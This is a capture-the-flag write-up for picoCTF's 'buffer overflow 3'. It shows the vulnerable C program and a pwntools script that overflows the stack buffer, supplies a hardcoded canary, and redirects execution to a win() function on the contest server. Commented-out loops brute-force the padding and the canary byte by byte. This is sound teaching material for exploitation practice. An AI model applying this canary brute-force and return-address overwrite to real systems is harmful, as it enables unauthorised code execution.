# Write-up of the challenge "buffer overflow 3"

This challenge is part of the "Binary exploitation" category and is in the hard category.

# Goal of the challenge

The objective of the challenge is just to enter the size of the payload and then write the actual payload. The user is asked to enter some input and after doing the program responds **"Where's the flag"**. If you enter too much characters you will get **""***** Stack Smashing Detected *****"** because there's a canary.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}

```

## Problem

So what I had problem with is that it was a very long time ago I bruteforced some canary. So I did some research in like 10 minutes and found out that we can just bruteforce the canary using a byte from the **"256"** till we found the true canary.

## Security breach

So the problem with this is that we can specify the size of the payload therefore we can buffer overflow and overrite the **"$RIP"**.

## Solution
So there could have been a shorter solution for sure but my idea was to bruteforce the four canary values. Since there are 256 bytes we can check if adding any of those bytes will crash the program. If it doesn't crash the program then we found a value in the canary. We repeat that process untill we find the four canary values. Then we try to bruteforce the **"$RIP"** location and just send the win address.

```
from pwn import *

p = process('./vuln')
p = remote('saturn.picoctf.net', 57299)

payload = b'A' * 64 + b'B' + b'i' + bytes([82]) + bytes([100]) +b'A' * 16  + p32(0x08049336)

p.sendline(str(len(payload)).encode())


p.sendline(payload)

# res = p.recvall(timeout=2)

# print(res.decode())

p.interactive()


# for _b in range(256):
#     p = remote('saturn.picoctf.net', 57299)

#     payload = b'A' * 64 + b'B' + b'i' + bytes([82]) + bytes([100]) + (b'A' * _b) + p32(0x08049336)
#     p.sendline((str(len(payload))).encode())
#     p.sendline(payload)

#     try:
#         p.recvline()
#         res1 = p.recvline()
#         res2 = p.recvline()

#         if b'picoCTF' in res2 or b'picoCTF' in res1:
#             print('FOUND', _b)
#             break
#     except EOFError:
#         pass  # Program crashed, wrong offset
    
#     p.close()


# # 64 then canary val
# # 72 saved RIP
# for _b in range(256):
#     p = remote('saturn.picoctf.net', 63032)
#     p.sendline(b'72')

#     payload = b'A' * 64 + b'B' + b'i' + bytes([82]) + bytes([100]) + bytes([_b])
#     p.sendline(payload)

#     p.recvline()
#     res2 = p.recvline()

#     if b'Ok' in res2:
#         print('FOUND', _b)
#         break

#     p.close()




```

After executing the script we get the flag back!

If you liked this writeup you can star my repository.